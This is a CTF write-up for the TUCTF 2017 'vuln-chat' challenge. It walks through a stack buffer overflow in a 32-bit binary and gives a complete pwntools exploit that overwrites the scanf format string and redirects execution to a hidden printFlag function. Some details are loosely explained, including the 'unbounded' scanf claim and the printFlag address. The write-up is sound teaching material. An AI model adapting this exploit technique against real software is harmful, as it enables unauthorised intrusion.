# TUCTF 2017 - vuln-chat Writeup

## Overview
This challenge, **vuln-chat**, is a 32-bit binary exploitation problem from TUCTF 2017. The goal is to exploit a buffer overflow vulnerability to call the hidden `printFlag` function and retrieve the flag.

Files provided:
```
flag.txt
vuln-chat
```

Additionally, a walkthrough recording is included in **`vuln.cast`** for easy replay using [asciinema](https://asciinema.org/).

---

## Step 1. Analyzing the Binary
First, let's determine the binary's basic properties:

```bash
file vuln-chat
```
Output:
```
vuln-chat: ELF 32-bit LSB executable, Intel i386, dynamically linked, not stripped
```

Check for security protections:
```bash
pwn checksec vuln-chat
```
Output:
```
Arch:       i386-32-little
RELRO:      No RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x8048000)
Stripped:   No
```

Key points:
- **NX enabled**: Cannot directly execute shellcode on the stack.
- **No PIE**: Function addresses are static.
- **No stack canary**: Vulnerable to buffer overflow.

---

## Step 2. Reverse Engineering with Ghidra
The `main` function (from `ghidra.txt`):

```c
undefined4 main(void) {
    char local_31[20];
    char local_1d[20];
    undefined4 local_9;
    undefined1 local_5;

    setvbuf(stdout, NULL, 2, 0x14);
    puts("----------- Welcome to vuln-chat -------------");
    printf("Enter your username: ");

    local_9 = 0x73303325;  // format string "%30s"
    local_5 = 0;
    __isoc99_scanf(&local_9, local_1d);

    printf("Welcome %s!\n", local_1d);
    puts("Connecting to 'djinn'");
    sleep(1);
    puts("--- 'djinn' has joined your chat ---");
    puts("djinn: I have the information. But how do I know I can trust you?");

    printf("%s: ", local_1d);
    __isoc99_scanf(&local_9, local_31);

    puts("djinn: Sorry. That's not good enough");
    fflush(stdout);
    return 0;
}
```

Hidden function:
```c
void printFlag(void) {
    system("/bin/cat ./flag.txt");
    puts("Use it wisely");
}
```

**Vulnerability:**
- The second `scanf` call writes into `local_31` (20 bytes), but user input is **not bounded**, allowing buffer overflow.
- Goal: Overflow the buffer to overwrite the **saved return address** with the address of `printFlag`.

---

## Step 3. Finding the Offsets
Run the binary under `gdb` to identify offsets.

### Username buffer
```
AAAAAAAAAAAAAAAA
```
The buffer size for the username (`local_1d`) is 20 bytes.

### Message buffer overflow
Input a pattern into the second prompt to find how many bytes are needed to overwrite EIP.

```bash
AAAAAAAAAAAAAAAAAAAA
BBBBBBBBBBBBBBBBBBBB
```

Using GDB:
- Offset to **EIP overwrite** = **49 bytes**

---

## Step 4. Exploit Development

We will:
1. Send a valid username with proper format string.
2. Overflow the second input and overwrite return address with `printFlag`.

### Address of `printFlag`
```bash
gdb-peda$ b printFlag
Breakpoint 4 at 0x0804856e
```
Address: **`0x0804856b`** (adjusted to actual call).

### Final Exploit Code (`exp.py`)
```python
from pwn import *

# Step 1: Start the process
p = process("./vuln-chat")

# Step 2: Payload for username
pay = b"A" * 20
pay += p32(0x73393925)  # fake format string
p.recvuntil(b"Enter your username:")
p.sendline(pay)

# Step 3: Overflow payload to hijack control flow
pay1 = b"A" * 49
pay1 += p32(0x0804856b)  # Address of printFlag
p.recvline(b"I know I can trust you?")
p.sendline(pay1)

# Step 4: Switch to interactive to read flag
p.interactive()
```

---

## Step 5. Running the Exploit

```bash
python exp.py
```

Output:
```
Connecting to 'djinn'
--- 'djinn' has joined your chat ---
djinn: I have the information. But how do I know I can trust you?
AAAAAAAAAAAAAAAAAAAA%99s: djinn: Sorry. That's not good enough
ctf{test_flag}
Use it wisely
```

Flag captured successfully: **`ctf{test_flag}`**

---

## Step 6. Walkthrough Recording
The full exploitation process was recorded using **asciinema** and saved in `vuln.cast`.

To replay:
```bash
asciinema play vuln.cast
```

This will show the entire step-by-step terminal session used to solve the challenge.

---

## Conclusion
This challenge demonstrated a classic **stack-based buffer overflow** exploit. Key steps included:
- Identifying unsafe `scanf` usage.
- Calculating exact buffer overflow offsets.
- Redirecting execution to a hidden function (`printFlag`).

The inclusion of the `vuln.cast` file makes it easy to follow along visually.

**Flag:**
```
ctf{test_flag}
```

